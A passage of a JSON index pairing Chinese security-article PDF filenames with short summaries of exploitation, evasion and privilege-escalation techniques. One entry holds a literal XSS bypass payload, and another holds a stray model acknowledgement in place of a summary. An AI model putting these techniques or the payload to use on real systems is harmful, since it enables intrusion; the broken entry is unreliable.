        "FileName": "9306-思科RV110W CVE-2020-3331 CVE-2020-3323漏洞分析.pdf"
    },
    {
        "page_content": "本文深入浅出地探讨了 Java 反序列化的基础知识，包括 JMX、Java 虚拟机、反射、序列化和反序列化等概念。作者通过示例代码和 CTF 案例，详细介绍了 Java 反序列化的利弊，并提供了利用反序列化进行远程代码执行的具体方法。",
        "FileName": "10508-浅析Java反序列化.pdf"
    },
    {
        "page_content": "本文分析了两个与 Linux 能力相关的特殊案例。第一个案例解释了为什么普通用户可以执行 dumpcap 而 strace dumpcap 会提示权限不足，原因是 strace 在执行时会忽略文件能力。第二个案例探讨了 root 用户切换到非 root 用户后能力的变化，发现 su 程序调用了 setuid 系统调用，导致允许能力集和有效能力集被清除。",
        "FileName": "11716-关于linux capability的两个特殊案例.pdf"
    },
    {
        "page_content": "该文档分析了 Spring 框架中 Spel 表达式的使用情况，重点关注 Spring Data JPA 和 Spring Data MongoDB 中 Spel 解析的差异。它发现 Spring Data MongoDB 中存在一个安全问题，其中 Spel 表达式可以在请求时解析，允许攻击者执行任意命令。该文档还讨论了 Spel 在配置中的使用，以及它如何与 Actuator 结合起来放大其危害。",
        "FileName": "11478-Spel的研究总结.pdf"
    },
    {
        "page_content": "该文档记录了一次对某高校教务系统的实战 getshell 攻击。攻击者通过 fuzz 目录发现了一个没有验证码的 doc 目录，爆破后获得管理员账户，但发现管理员功能有限。随后，攻击者发现教师用户有上传点，并利用 iis6 解析漏洞拿下系统。",
        "FileName": "8006-记一次，对母校的实战getshell记录.pdf"
    },
    {
        "page_content": "本文探讨了通过利用 HTML 解析逻辑绕过词法解析安全机制来实现跨站脚本（XSS）攻击的方法。尽管使用了净化型词法解析器，但通过提供欺骗性 HTML 来让解析器将数据视为文本数据而不是计算机指令，仍然有可能实现 XSS 攻击。本文分析了 TinyMCE 和 Froala 等净化型解析器中的具体漏洞，并提供了预防措施和缓解策略，例如实施内容安全策略 (CSP) 和定期更新库。",
        "FileName": "9795-LEXSS 绕过词法解析过程中的安全机制.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用一系列漏洞（包括 Log4j2、CVE-2021-42287 和 CVE-2021-42278）从外网渗透到内网，最终获得域控制器的权限，并提供了详细的步骤和脚本，展示了如何利用这些漏洞进行攻击。",
        "FileName": "10697-从外网 log4j2 RCE 再到内网核弹组合拳漏洞 CVE-2021-42287、CVE-2021-42278 拿到 DC.pdf"
    },
    {
        "page_content": "该文档主要讨论了 CTF 中的 COOKIE、SESSION 和 TOKEN，解释了这些机制的工作原理以及它们在身份验证和会话管理中的作用。文档还探讨了这些机制的潜在安全漏洞，例如伪造、包含和爆破，并提供了利用这些漏洞的示例。",
        "FileName": "12754-CTF中的COOKIE&SESSION&TOKEN.pdf"
    },
    {
        "page_content": "本文主要介绍了 Windows 系统中利用内核溢出漏洞进行权限提升的方法和思路。通过查看系统补丁信息，查找缺失的、可利用的补丁，并使用相应的提权漏洞利用 EXP 实现权限提升。文中介绍了多种查询补丁信息的方法和工具，以及利用漏洞 EXP 的方法，包括 MSF 框架、Empire 框架、Sherlock 脚本和 Windows-Exploit-Suggester 工具。",
        "FileName": "8292-Windows下常见的内核溢出提权.pdf"
    },
    {
        "page_content": "该文档介绍了 SSTI 模板注入漏洞，它是一种利用用户输入来控制渲染模板的漏洞，从而导致文件泄露或远程代码执行。文档分析了 SSTI 漏洞的成因、类型和利用方法，并提供了绕过各种限制的技巧，例如绕过中括号、逗号和双大括号。",
        "FileName": "7746-SSTI模板注入(Python+Jinja2).pdf"
    },
    {
        "page_content": "本文介绍了一种绕过卡巴斯基内存扫描的 Cobalt Strike Beacon 方法，通过去除 Beacon 内存的可执行属性，在 Beacon 进入睡眠时取消其可执行属性，在 Beacon 线程醒来时触发异常恢复其可执行属性，从而绕过内存扫描。",
        "FileName": "9399-cs bypass卡巴斯基内存查杀 2.pdf"
    },
    {
        "page_content": "文档主题是 SSRF（服务器端请求伪造）漏洞，内容涵盖了 SSRF 漏洞的定义、成因、危害、利用协议、绕过方法、加固和防御措施，以及云上 SSRF 漏洞的利用和防御。",
        "FileName": "12227-SRC中的SSRF漏洞挖掘笔记1.0.pdf"
    },
    {
        "page_content": "该文档分析了 Struts2-002 Java 代码审计漏洞，该漏洞是一个 XSS 漏洞，当 s:url 和 s:a 标签的 includeParams 属性设置为 all 时触发。漏洞影响 Struts 2.0.0 至 2.1.8.1 版本，通过将请求参数合并到 URL 中导致 XSS 攻击。官方修复将 <script> 替换为 script，但可以通过绕过，例如使用 &lt;script 1&gt;alert(1)&lt;/script&gt;。",
        "FileName": "7916-Java代码审计之Struts2-002.pdf"
    },
    {
        "page_content": "该文档分析了 Java 反序列化中 ROME 库的主题和内容，重点介绍了 ToStringBean 类在任意类加载中的关键作用。它还提供了 ROME 库中用于绕过黑名单和实现任意类加载的各种技术，包括使用 EqualsBean、ObjectBean、HashTable 和 BadAttributeValueExpException。此外，该文档还介绍了使用 Javassist 库缩短恶意类字节码的方法，以绕过基于长度的限制。",
        "FileName": "12768-Java反序列化之ROME反序列化.pdf"
    },
    {
        "page_content": "该文档记录了一次红队经历，详细描述了作者如何通过信息收集、漏洞利用和密码重置等技术渗透多个目标网站，包括暴露的路由器、存在漏洞的中间件和具有默认密码的CMS系统。作者成功获得了对多个系统的访问权限，包括root权限和shell访问，并从中学到了宝贵的经验。",
        "FileName": "8411-记一次红队经历.pdf"
    },
    {
        "page_content": "该文档主要讨论了在内网环境中维持权限的各种技术，包括使用 Mimikatz 注入 Skeleton Key、利用 HookPasswordChangeNotify 攻击、基于验证 DLL 加载 -SSP、利用 DCSync 导出域哈希、生成黄金票据、使用 PTH 方式、利用 DSRM 目录服务恢复模式、利用 SID History 属性、创建计划任务、注册自启动服务、映像劫持、修改注册表登录脚本、隐藏历史操作命令、修改文件创建时间、创建隐藏文件、端口复用、添加超级用户、suid 权限维持、ssh 私钥免密登录、计时任务反弹 shell 等。",
        "FileName": "12539-内网权限维持总结.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Tornado 模板注入漏洞，包括漏洞组成结构、Tornado 模板渲染函数、Tornado 中 SSTI 手法、利用户口令、绕过字符限制、过滤 payload 等内容。",
        "FileName": "12260-Tornado模板注入.pdf"
    },
    {
        "page_content": "该文档探讨了浏览器的多进程和多线程模型，重点介绍了 Service Worker 的概念和功能。Service Worker 是一种代理服务器，可以拦截和修改网络请求，从而实现持久化 XSS 攻击。文档还介绍了 JSONP 和跨域技术，以及如何利用它们来注册恶意 Service Worker 脚本。",
        "FileName": "8679-持久化xss基础.pdf"
    },
    {
        "page_content": "本文档介绍了如何在树莓派上安装和配置 Kali Linux 操作系统，包括安装配件、烧录系统、自动连接 Wi-Fi 和启动 SSH 服务。通过这些配置，用户可以远程访问树莓派并使用其渗透工具，例如在无线 Wi-Fi 攻击中使用 aircrack-ng。",
        "FileName": "7359-DIY  树莓派搭载kali Linux.pdf"
    },
    {
        "page_content": "该文档描述了作者发现的一种方法，可以逃逸沙箱编辑器并执行远程代码执行 (RCE)，从而访问 AWS 凭证、SSL 证书和其他敏感信息。作者通过调用命令面板并打开终端，获得了对系统文件和命令的访问权限，并最终通过 ECS 元数据 URI 检索了 AWS 凭证。",
        "FileName": "7223-Bug Bounty突破沙箱编辑器执行RCE.pdf"
    },
    {
        "page_content": "该文档分析了 .NET 中实现 ISerializable 接口的链，这些链可用于反序列化攻击。文档重点介绍了 WindowsIdentity 链，并解释了如何利用其 BootstrapContext 属性进行反序列化。文档还总结了所有实现 ISerializable 接口且继承自 System.Security.Claims.ClaimsIdentity 类的类都可以作为入口链使用。",
        "FileName": "10672-dotNet 反序列化ISerializable系列链分析.pdf"
    },
    {
        "page_content": "SSP Leak 是一种通过故意触发栈溢出保护来泄露任意地址的攻击技术。攻击者通过修改要输出变量的地址，将栈溢出覆盖的字节指向需要读取的地址，从而在程序崩溃后打印出该地址的内容。这种攻击通常用于泄露内存中的 flag 或其他信息，但由于无法获取 shell，因此使用较少。",
        "FileName": "12672-SSP leak.pdf"
    },
    {
        "page_content": "该文档主要分析了 ROME 链的原理和利用方法，并提供了缩短 payload 的技术，包括使用 ASM 删除指令和利用其他触发点。",
        "FileName": "11200-ROEM链及其缩短链.pdf"
    },
    {
        "page_content": "这篇文档主要讨论了 Docker 逃逸的常见方法，包括用户配置不当、服务缺陷和系统漏洞。它强调了 Docker 容器的隔离机制，并提供了利用这些漏洞来逃逸容器的具体步骤。",
        "FileName": "7881-Docker逃逸小结第一版 更新.pdf"
    },
    {
        "page_content": "该文档介绍了 Java Debug Wire Protocol (JDWP) 的漏洞利用，包括 JDWP-shellifier、Metasploit 框架和 Java 调试器 (JDB) 的利用方法。它强调了 JDWP 漏洞利用的轻量级、易于集成和直接性，并提供了示例代码和链接以供进一步研究。",
        "FileName": "7303-JDWP无依赖攻击.pdf"
    },
    {
        "page_content": "该文档分析了 XXL-JOB <=2.0.2 中未授权 Hessian2 反序列化漏洞，该漏洞允许攻击者在未经授权的情况下执行任意代码。漏洞的根源在于未授权 API 允许访问，以及反序列化过程中使用 Hessian2，导致攻击者可以利用恶意 JNDI 注入利用服务生成 Hessian2 Gadget 并发送给目标服务器，从而执行任意代码。",
        "FileName": "11091-老曲新唱之XXL-JOB未授权Hessian2反序列化调试分析.pdf"
    },
    {
        "page_content": "**主题：** Nacos Client Yaml 反序列化漏洞分析\n\n**内容：** Nacos Client Yaml 反序列化漏洞影响单独使用 nacos-client SDK 的用户，该漏洞允许攻击者通过修改 Nacos 配置为 Yaml 反序列化 payload 来远程执行代码。该漏洞在 Nacos 1.4.2 版本中已修复，修复方法是使用 SnakeYaml 提供的 SafeConstructor 解析 Yaml 配置。",
        "FileName": "10355-Nacos Client Yaml反序列化漏洞分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何通过分析敏感文件泄露来进行实战渗透，重点关注一个基于 .NET 的仪器预约平台。通过代码审计，作者发现了未授权的文件上传漏洞，并利用该漏洞构造了 POC，最终成功获得了目标系统的 shell 权限。",
        "FileName": "8059-实战渗透-从敏感文件泄露到Getshell.pdf"
    },
    {
        "page_content": "该文档分析了 C3P0 反序列化常⽤⽅式，并提供了利用这些⽅式的示例代码。它还讨论了 JNDI 注⼊和 BeanFactory 利用。",
        "FileName": "11830-C3P0反序列化常用方式及不出网利用.pdf"
    },
    {
        "page_content": "该文档是一份域控提权合集，其中包含了 12 种针对域控的提权方法，包括利用 GPP 和 SYSVOL 中的密码、MS14-068 漏洞、DNSAdmins 权限、不安全的 GPO 权限、不安全的 ACLs 权限、Exchange、LLMNR/NBT-NS 投毒、Kerberoasting、AD 回收站等。",
        "FileName": "7726-域控提权合集.pdf"
    },
    {
        "page_content": "该文档分析了一次信息泄露导致的越权漏洞，该漏洞源于前端加密的缺陷，攻击者可以解密 cookie 并修改参数实现越权。文档概述了漏洞成因、过程、复测和修复思路，建议使用非对称加密方式并验证数据完整性以提高安全性。",
        "FileName": "8022-一次信息泄露引发的越权.pdf"
    },
    {
        "page_content": "本文介绍了一种新型的 Java 一句话木马，它利用 Java 中的 JS 引擎实现，通过调用 JS 引擎的 eval 函数，然后在 Payload 中反过来调用 Java 对象，从而实现 Java 一句话木马的功能。这种新型木马比传统的字节码注入方式体积更小，变化种类更多，使用起来更灵活，但 Payload 编写和调试较为麻烦。",
        "FileName": "9715-一种新型Java一句话木马的实现.pdf"
    },
    {
        "page_content": "该文档分析了 SpEL 注入 RCE 的技术，包括使用 T() 操作符构造对象、使用 # 操作符标记对象、利用 Java 反射机制加载远程类库和本地类库，以及绕过字符串过滤的技巧。",
        "FileName": "9245-SpEL注入RCE分析与绕过.pdf"
    },
    {
        "page_content": "该文档介绍了如何实现一个 fuzzer，包括 fuzzer 的整体流程、变异算法、执行 fuzz 的过程以及如何优化变异算法。",
        "FileName": "12632-如何实现一个 fuzzer.pdf"
    },
    {
        "page_content": "本文记录了一次渗透测试，其中利用了 Weblogic 弱口令、Fastjson 远程命令执行、任意文件上传、后台弱口令、SQL 注入和 Shiro 反序列化命令执行等漏洞，最终成功获取目标系统的控制权。",
        "FileName": "8251-记一次运气爆棚的渗透测试.pdf"
    },
    {
        "page_content": "Apache HTTP Server 的 mod_proxy 组件存在一个漏洞（CVE-2022-31813），该漏洞允许攻击者通过删除 X-Forwarded 标头来欺骗应用程序服务器，从而导致身份验证绕过、IP 地址欺骗或拒绝服务攻击。",
        "FileName": "12533-CVE-2022-31813：Apache HTTP Server HTTP转发地址Forword与mod_proxy漏洞利用.pdf"
    },
    {
        "page_content": "**主题：** 栈溢出 ROP 利用基础\n\n**内容：** 文档介绍了栈溢出 ROP 利用的基础知识，包括特征识别、偏移计算、gadget 查找和 payload 构造，并提供了三个示例程序的利用过程，涵盖了控制程序执行系统调用、利用可写可执行缓存区和利用 gets() 函数控制输入流的情况。",
        "FileName": "10721-栈溢出ROP利用基础（二）.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用站库分离漏洞渗透目标数据库，包括信息泄露、MSSQL渗透、代码审计和上传WebShell等步骤，最终成功获取目标服务器的控制权。",
        "FileName": "8584-实战-站库分离拿下WebShell.pdf"
    },
    {
        "page_content": "本文档探讨了 Web 缓存投毒技术，该技术利用缓存机制将恶意 HTTP 响应提供给用户。它详细介绍了缓存的工作原理、缓存键和非缓存键的概念，并提供了利用非缓存键进行投毒的示例。此外，本文档还介绍了使用 Burp Suite 的 Param Miner 插件来识别非缓存键，并提供了利用多个非缓存键和未知标头进行投毒的示例。",
        "FileName": "11449-【由浅入深_打牢基础】WEB缓存投毒（上）.pdf"
    },
    {
        "page_content": "该文档分析了 Cobalt Strike 中的 DOS 漏洞 (CVE-2021-36798)，该漏洞是由对截屏功能的返回数据解析处理不当引起的，攻击者可利用该漏洞控制截屏大小，导致 TeamServer 不断申请内存，最终导致 DOS。",
        "FileName": "10260-cobaltstrike DOS漏洞（CVE-2021-36798）分析.pdf"
    },
    {
        "page_content": "该文档分析了 Java CMS 的安全审计，重点关注了模板注入和存储型 XSS 漏洞。审计发现，该 CMS 使用了 Freemarker 组件，存在模板注入漏洞，攻击者可以通过修改模板文件来执行恶意代码。此外，该 CMS 还存在存储型 XSS 漏洞，攻击者可以通过评论框提交恶意脚本，导致在渲染页面时执行 XSS payload。",
        "FileName": "11760-对Java CMS的审计的一次尝试.pdf"
    },
    {
        "page_content": "该文档介绍了 Apache Shiro 身份验证绕过漏洞 (CVE-2020-11989)，该漏洞影响 Apache Shiro 1.5.3 之前的版本，当与 Spring 控制器一起使用时，特制请求可能导致身份验证绕过。文档提供了漏洞详情、影响范围、漏洞分析和实战复现，并建议利用弱口令进入同类型站点后台，收集后台接口 URL，然后利用 Shiro 权限绕过漏洞将这些 URL 拼接到目标站点，以达到未授权访问的目的。",
        "FileName": "9249-记一次Apache Shiro权限绕过实战.pdf"
    },
    {
        "page_content": "该文档分析了 JDK7u21 反序列化漏洞中涉及的类和接口，包括 LinkedHashSet、HashSet、HashMap、TemplatesImpl、AbstractTranslet、Proxy 和 AnnotationInvocationHandler，并详细介绍了漏洞利用过程，包括通过 ClassPool 构造字节码、使用 Reflections 反射框架赋值、调用 equalsImpl 方法触发漏洞等步骤。",
        "FileName": "7236-JDK7u21 反序列化漏洞.pdf"
    },
    {
        "page_content": "该文档介绍了一种称为 AST 注入的新技术，该技术允许攻击者在两个流行的模板引擎（Handlebars 和 Pug）中执行任意命令。AST 注入利用原型污染漏洞，允许攻击者在解析器或编译器过程中将任意 AST 注入函数中。通过这种技术，攻击者可以绕过模板引擎的过滤和验证机制，并执行未经授权的代码。",
        "FileName": "10218-AST注入.pdf"
    },
    {
        "page_content": "CSRF（跨站请求伪造）是一种网络攻击手段，攻击者利用受信任用户的身份向服务端发起伪造的请求，从而达到攻击目的。CSRF攻击分为狭义和广义两种，狭义的CSRF攻击是指攻击者在受害者浏览器中植入代码，以受害者的身份向服务端发起请求；广义的CSRF攻击是指攻击者预测出HTTP接口中需要传递的所有参数，然后通过任意方式调用接口，对服务端进行操作。CSRF攻击的防御措施包括在后台接口层和前端进行防御，如使用CSRF Token、检查HTTP Referer字段和设置SameSite Cookies等。",
        "FileName": "8514-csrf漏洞浅谈.pdf"
    },
    {
        "page_content": "该文档详细介绍了对某运维系统的代码审计，该系统使用 Django、MongoDB 和 Redis，并发现了多个漏洞，包括前台 RCE、后台 YAML 反序列化和后台命令注入，这些漏洞都是由于默认配置、未授权访问和安全意识薄弱造成的。",
        "FileName": "9195-某运维系统的代码审计笔记（Django+MongoDB+Redis）.pdf"
    },
    {
        "page_content": "该文档分析了 WordPress 评论插件 wpDiscuz 中的一个任意文件上传漏洞。该漏洞允许攻击者通过修改文件内容绕过文件类型检查，上传恶意文件并获得网站控制权。文档详细介绍了漏洞的分析过程，包括入口点、上传功能和文件类型判断的实现。此外，文档还提供了检测和利用漏洞的脚本，以及利用该漏洞的特征信息。",
        "FileName": "8138-wordpress评论插件wpDiscuz任意文件上传漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了通达 OA 历史漏洞，包括 2013、2015 和 2017 年的漏洞。它详细介绍了漏洞点、利用方法和绕过技术，并提供了代码示例和数据包。该文档突出了白盒漏洞挖掘的思路和师傅们的绕过技巧，为安全研究人员提供了有价值的见解。",
        "FileName": "10726-漏洞分析｜某OA历史漏洞复现分析.pdf"
    },
    {
        "page_content": "该文档探讨了 DNS 安全中的两个漏洞：DNS 劫持和 DNS 拒绝服务。DNS 劫持涉及利用废弃的 DNS 记录来重定向流量，而 DNS 拒绝服务利用 DNS 对 NS 记录的完全解析特性来放大流量，从而导致拒绝服务。文档还介绍了 DNSSEC（DNS 安全扩展）作为一种缓解这些漏洞的机制。",
        "FileName": "9047-两个有趣的DNS 安全问题研究.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-2551 漏洞，该漏洞利用了 Weblogic IIOP 反序列化中的错误，导致攻击者可以通过 JNDI 注入实现远程代码执行。文档详细介绍了 IIOP、CORBA、RMI-IIOP 等相关技术，并通过代码示例演示了漏洞的利用过程和修复方法。",
        "FileName": "7422-CVE-2020-2551 Weblogic IIOP反序列化漏洞分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了 D-Link DIR-850L 路由器中的两个远程命令执行漏洞，这些漏洞允许攻击者通过 XML 数据请求获取管理员权限并执行任意命令。第一个漏洞存在于 hedwig.cgi 脚本中，它允许非管理员用户发送 XML 数据并重载路由器的配置信息。第二个漏洞存在于 fatlady.php 脚本中，它允许攻击者加载任意 PHP 文件并执行其中的代码。利用这些漏洞，攻击者可以获得对路由器的完全控制权，包括执行任意命令、修改配置和窃取敏感信息。",
        "FileName": "7503-dlink850l两个漏洞获取shell.pdf"
    },
    {
        "page_content": "**主题：** LFCMS 审计报告\n\n**内容：** 该文档详细分析了 LFCMS 中的多个 SQL 注入漏洞，这些漏洞允许攻击者执行任意 SQL 查询并提取敏感数据。此外，该文档还描述了利用缓存漏洞和跨目录文件读取漏洞来获取 Web 服务器上的代码执行权限。",
        "FileName": "7844-LFCMS的一次审计.pdf"
    },
    {
        "page_content": "该文档分析了 Jetty 服务器中内存注入攻击的原理和实现方法。它详细介绍了如何获取 ServletHandler 对象、获取 _filterPathMappings 变量，以及如何实例化 FilterMapping 对象并将其添加到 _filterPathMappings 中，从而实现恶意 Filter 的注入。",
        "FileName": "12182-Jetty 内存马注入分析.pdf"
    },
    {
        "page_content": "好的，我明白了。我将只输出文档的内容，而不包含主题。",
        "FileName": "9451-CommonsCollections1-8.pdf"
    },
    {
        "page_content": "该文档详细介绍了作者利用记某 CMS 漏洞获取 shell 的过程。作者通过弱密码登录后台，发现无法绕过上传点，但通过安装扩展管理插件并修改代码，成功在服务器上写入一句话木马，并通过蚁剑连接执行命令，最终绕过 disable_functions 限制，获得了 shell 权限。",
        "FileName": "9359-记某CMS漏洞getshell.pdf"
    },
    {
        "page_content": "该文档分析了 Apple 的 Sign in with Apple 授权过程中的一个漏洞，该漏洞允许攻击者使用任意电子邮件地址登录并接管第三方应用程序中的用户帐户。该漏洞源于授权过程中一个逻辑错误，其中 Apple 服务器在收到包含任意电子邮件地址的 HTTP 请求时会生成有效的 JWT（JSON Web 令牌）。该漏洞影响了所有已集成 Sign in with Apple 的应用程序，并可能导致严重的帐户接管问题。Apple 已修复此漏洞，并建议开发人员在验证来自客户端的数据时遵循标准授权协议。",
        "FileName": "8484-漏洞分析 - Apple授权过程的任意账号登录漏洞($100,000).pdf"
    },
    {
        "page_content": "该文档对 Java JFinal_cms 进行了一次审计，分析了其技术选型、架构和漏洞，包括 XSS、SSTI 和 SQL 注入漏洞，并提供了利用这些漏洞的示例。",
        "FileName": "11999-对Java JFinal_cms的一次审计过程.pdf"
    },
    {
        "page_content": "该文档讨论了 Flask 框架在开启 debug 模式时的 PIN 码安全性问题。PIN 码是通过 Flask 用户名、modname、Flask 库的 app.py 绝对路径、网络 MAC 地址的十进制数和机器 ID 等信息生成的。通过模板注入，攻击者可以获取这些信息并生成 PIN 码，从而进入 Python 交互式 shell 并执行任意代码。",
        "FileName": "11036-Flask开启debug时PIN码的安全性问题.pdf"
    },
    {
        "page_content": "该文档主要介绍了利用 Shiro 反序列化漏洞进行深度攻击的方法，包括获取 key、回显和内存 shell 的实现。该漏洞利用了 Shiro 框架在 Java Web 登录认证中的广泛应用，并利用了其加密 payload 的特性，使其不易被检测和拦截。文档详细介绍了漏洞原理、攻击脚本的修改和使用，以及内存 webshell 的适配方法，为安全研究人员和渗透测试人员提供了深入的攻击指南。",
        "FileName": "8445-深入利用Shiro反序列化漏洞.pdf"
    },
    {
        "page_content": "该文档分析了 .NET 源代码中文件上传绕过 WAF 的漏洞，重点关注 `System.Web.HttpMultipartContentTemplateParser.Parse()` 函数。它解释了如何解析 `Content-Type` 和 `Content-Disposition` 头，并展示了如何利用特殊空白字符和分隔符来绕过 WAF 保护，从而上传恶意文件。",
        "FileName": "10941-从dotnet源码看⽂件上传绕waf.pdf"
    },
    {
        "page_content": "该文档分析了傀儡进程的创建和实现，包括使用挂起模式创建进程、卸载内存数据、申请新空间、写入进程内存和修改线程上下文等步骤。通过这些步骤，可以将恶意代码注入到目标进程中，从而实现傀儡进程的创建。",
        "FileName": "10477-傀儡进程的分析与实现.pdf"
    },
    {
        "page_content": "本教程介绍了 angr 库的主要概念和模块，包括顶层接口、基本属性、loader、factory、blocks、states、Simulation Managers、analyses 等。它提供了 angr 使用的概述，并指导用户如何使用这些接口进行二进制分析和研究。",
        "FileName": "7117-angr 系列教程(一）核心概念及模块解读.pdf"
    },
    {
        "page_content": "该文档重点介绍了 Redis 未授权访问漏洞，该漏洞允许攻击者在特定条件下以 root 身份运行 Redis，从而导致未经授权访问、数据泄露、数据销毁、主机系统环境泄露和主机控制权被获取等严重后果。文档还提供了漏洞原理、危害、利用前提和缓解措施的详细说明。",
        "FileName": "12362-Redis漏洞总结.pdf"
    },
    {
        "page_content": "该文档主要分析了 taocms 代码中的 SQL 注入漏洞，重点关注了 delist、getquery、updatelist、get_one 和 getlist 等未过滤的函数方法。通过审计这些方法，作者发现了多个注入点，并提供了相应的测试 payload。文档还强调了对通用模块方法进行漏洞检查的重要性，因为这些方法的漏洞可能会影响多个功能模块，扩大危害。",
        "FileName": "11063-初学代码审计之taocms.pdf"
    },
    {
        "page_content": "“快看”cms v1.32 代码审计报告分析了该 CMS 中存在的 SQL 注入、存储型 XSS 和反射型 XSS 漏洞。报告详细描述了漏洞的成因、利用方式和影响，并提供了相应的修复建议。",
        "FileName": "11322-“快看”cms v1.32代码审计.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2022-34265 Django SQL 注入漏洞，该漏洞影响了 Django 的特定版本。漏洞存在于 Extract() 和 Trunc() 函数中，当 lookup_name 和 kind 参数未经过适当过滤时，攻击者可以构造恶意 payload 导致 SQL 注入。文档通过调试和代码分析，详细说明了漏洞在不同数据库后端（SQLite、PostgreSQL、MySQL、Oracle）中的表现，并提供了修复补丁的链接。",
        "FileName": "11628-CVE-2022-34265 Django SQL 注入漏洞调试分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用动态定位 API 编写 shellcode，通过分析进程环境块 (PEB) 和加载顺序模块链表 (InLoadOrderModuleList)，可以找到目标动态链接库 (DLL) 的基地址，然后通过导出表查找函数的相对虚拟地址 (RVA)，最后计算出函数的绝对虚拟地址 (VA) 并调用。",
        "FileName": "10490-shellcode编写之动态定位API.pdf"
    },
    {
        "page_content": "该文档分析了一个名为“160 个 crackme 系列的第 5 个”的 crackme，该 crackme 使用 UPX 压缩壳，并使用 Delphi 框架编写。文档详细介绍了如何手动和自动脱壳，并使用静态和动态分析技术来绕过程序中的多个保护层。最终，文档提供了成功执行 crackme 所需的步骤的总结。",
        "FileName": "11818-通过一个crackme学习逆向基础知识以及Delphi框架.pdf"
    },
    {
        "page_content": "该文档介绍了使用 Mimikatz 工具从 Windows 本地系统中抓取用户密码哈希值的方法，包括在线和离线模式，以及使用其他工具（如 pwdump7、QuarkPwDump 和 procdump）的替代方法。它还讨论了明文密码问题以及如何通过修改注册表设置来解决。",
        "FileName": "8601-从mimikatz学Windows本地hash抓取.pdf"
    },
    {
        "page_content": "Thinkphp 6.0.2 版本之前存在一个 Session 安全漏洞，由于未对 Session ID 进行过滤，攻击者可以通过设置 Cookie 中的 PHPSESSID 值为任意字符，包括 PHP 代码，从而导致在服务器上创建恶意 PHP 文件并执行任意代码。",
        "FileName": "7109-Thinkphp  6.0.2 session id未作过滤导致getshell.pdf"
    },
    {
        "page_content": "该文档详细介绍了在域林环境中进行渗透测试的步骤，包括信息收集、漏洞利用、横向移动和凭据窃取。渗透测试人员利用各种工具和技术，如XRay、Neo-reGeorg和mimikatz，在目标网络中建立立足点，收集敏感信息并获取对域控制器的访问权限。",
        "FileName": "7232-初遇域林不知所措（一）.pdf"
    },
    {
        "page_content": "该文档分析了 Riviera Waves 系统中常用的数据结构 co_list，并介绍了操作系统底层机制，包括任务创建和状态转换、消息交换、计时器管理和动态内存分配。此外，文档还详细阐述了事件调度机制，包括事件注册、事件处理和事件清除。",
        "FileName": "9186-DA14531芯片固件逆向系列（2）- 操作系统底层机制分析.pdf"
    },
    {
        "page_content": "本文介绍了一种基于 TFIDF 的违法网站识别方法，该方法通过从网站中提取特定标签内容，进行分词和停顿词处理，形成网站的唯一文字标识，并使用 TFIDF 算法根据单词出现频率来判定网站是否违法。该方法在实践中取得了较高的准确率，但存在暗链和明链识别效果不同的问题，需要进一步改进。",
        "FileName": "11095-基于TFIDF的违法网站识别.pdf"
    },
    {
        "page_content": "本文探讨了如何通过修改文件末尾、创建稀疏文件、修改 inode 元数据和向 ELF 文件节中填充垃圾数据等方法来增加 ELF 文件的大小，从而绕过云端恶意分析和安全研究人员的样本分析。这些方法可以快速生成超大文件，但实际占用的磁盘空间可能很小，并且可以修改文件大小信息而不影响文件内容。",
        "FileName": "10221-如何避免文件上报-制作大文件.pdf"
    },
    {
        "page_content": "该文档讨论了企业安全建设的主题，提出了一个全面的安全防线框架，涵盖网络、系统、应用程序、数据和业务层面的安全措施，并强调了安全运营和人员培训的重要性。",
        "FileName": "10495-企业安全建设——安全防线建设.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Android 免杀技术，包括使用 msfvenom 生成恶意 APK、使用 TheFatRat 工具植入后门、使用 MsfVenom 嵌式方法以及源码混淆。通过对 APK 进行加壳、修改 XML 配置、去除权限校验、混淆代码和对抗反编译，可以有效绕过杀毒软件的检测，实现免杀效果。",
        "FileName": "12893-Android免杀小结.pdf"
    },
    {
        "page_content": "该文档详细介绍了栈迁移技术，包括其原理、实现步骤和一个利用栈迁移解决 10 字节溢出漏洞的示例。文档解释了如何将 ebp 寄存器转移到 bss 或 data 段，在其中构造 gadget，然后执行 leave 指令以实现栈迁移。该技术允许攻击者控制栈并执行任意代码，从而绕过栈溢出保护。",
        "FileName": "12189-栈迁移详解.pdf"
    },
    {
        "page_content": "该文档全面介绍了 JSON Web 令牌 (JWT) 的概念、漏洞和攻击技术，包括未经验证的签名、签名验证缺陷、密钥爆破、标头参数注入和算法混淆攻击。它提供了详细的示例和代码片段，展示了如何利用这些漏洞来绕过身份验证并访问未经授权的资源。",
        "FileName": "11904-初涉JWT.pdf"
    },
    {
        "page_content": "本文探讨了在前端开发中获取 CSRF 令牌的技巧，重点介绍了利用 XSS、HTML5 特性、CSS 选择器和 CSS 侧信道等方法来获取令牌，从而绕过 CSRF 保护措施。",
        "FileName": "7084-魔法才能打败魔法：关于获取csrf-token前端技巧思考.pdf"
    },
    {
        "page_content": "该文档分析了 Java 反序列化中的 Shiro 反序列化漏洞，重点关注了攻击者如何利用 AES 加密算法和 JavaBean 中的动态类执行来实现代码执行。文档还提供了两个利用链的示例，一个是使用 CC3 和 CC2，另一个是使用 JavaBean 和 AttrCompare。",
        "FileName": "12702-Java反序列化之Shiro反序列化利用.pdf"
    },
    {
        "page_content": "**主题：** ARM 架构下利用 CSU（Call Stack Unwinding）进行 Pwn 攻击。\n\n**内容：** 文档详细介绍了 ARM 架构下 CSU 的工作原理，包括 LDP、RET、LDR、BLR 等指令的使用，并通过示例演示了如何利用 CSU 来获取 libc 基址、送入 shellcode 并执行系统调用，从而实现 Pwn 攻击。",
        "FileName": "12204-arm架构下pwn的csu利用.pdf"
    },
    {
        "page_content": "该文档详细介绍了对 PHP Cscms 代码进行安全审计的过程，发现了两个漏洞：SSRF 和文件覆盖导致 GETSHELL。审计方法包括根据功能点定向审计和敏感函数回溯参数过程，并利用 PHPstorm 提高效率。通过分析代码，定位漏洞位置，并构造攻击请求包，成功利用漏洞实现了远程代码执行。",
        "FileName": "10929-Cscms代码审计-PHP.pdf"
    },
    {
